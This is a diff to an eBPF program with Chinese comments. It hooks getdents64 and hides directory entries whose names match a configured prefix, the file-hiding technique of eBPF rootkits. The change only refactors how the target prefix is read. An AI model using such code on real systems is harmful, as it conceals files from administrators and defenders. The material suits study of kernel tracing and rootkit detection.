@@ -31,7 +31,7 @@ char LICENSE[] SEC("license") = "Dual BSD/GPL";
 #define COPY_BUF_SIZE    128
 
 const volatile int target_strlen = 0;
-const char target_name[16] = {};
+const volatile char target_name[16] = {};
 
 struct {
 	__uint(type, BPF_MAP_TYPE_HASH);
@@ -85,7 +85,7 @@ int handle_exit(struct trace_event_raw_sys_exit *ctx)
 	u32 pid = bpf_get_current_pid_tgid() >> 32;
 	void **direntp, *dirent;
 	int ret = (int)ctx->ret;       /* getdents64 返回的字节数 */
-	char name[16], tmp[16];        /* name: 读到的文件名; tmp: 目标前缀 */
+	char name[16];                  /* 读到的文件名 */
 	long pos = 0;                  /* 当前遍历位置在缓冲区中的偏移（字节） */
 	__u16 prev_reclen_off = 0;     /* 前一个未隐藏条目的 d_reclen 字段在缓冲区中的偏移 */
 	bool has_prev = false;         /* 是否已经有未隐藏的前一个条目 */
@@ -104,10 +104,6 @@ int handle_exit(struct trace_event_raw_sys_exit *ctx)
 	/* 检查目标前缀是否有效 */
 	if (target_strlen <= 0 || target_strlen > 16)
 		goto out;
-
-	/* 从 rodata（只读数据段）读取目标前缀到栈上变量 tmp。
-	 * rodata 由用户态在 load 前通过 skel->rodata->target_name 设置。 */
-	bpf_probe_read_kernel(tmp, target_strlen, target_name);
 
 	/* ── 遍历 dirent 缓冲区 ──
 	 * #pragma unroll 提示编译器展开循环（但 verifier 仍需要确定上界）。
@@ -139,12 +135,13 @@ int handle_exit(struct trace_event_raw_sys_exit *ctx)
 					(void *)(dirent + pos + D_NAME_OFFSET));
 
 		/* ── 文件名前缀匹配 ──
-		 * 逐字节比较 name 和 tmp 的前 target_strlen 个字符。 */
+		 * 逐字节比较 name 和 target_name 的前 target_strlen 个字符。
+		 * target_name 是 .rodata 全局变量，可直接用数组下标访问。 */
 		bool match = true;
 		for (int j = 0; j < 16; j++) {
 			if (j >= target_strlen)
 				break;  /* 比较完目标长度，匹配成功 */
-			if (name[j] != tmp[j]) { match = false; break; }
+			if (name[j] != target_name[j]) { match = false; break; }
 		}
 
 		if (match) {
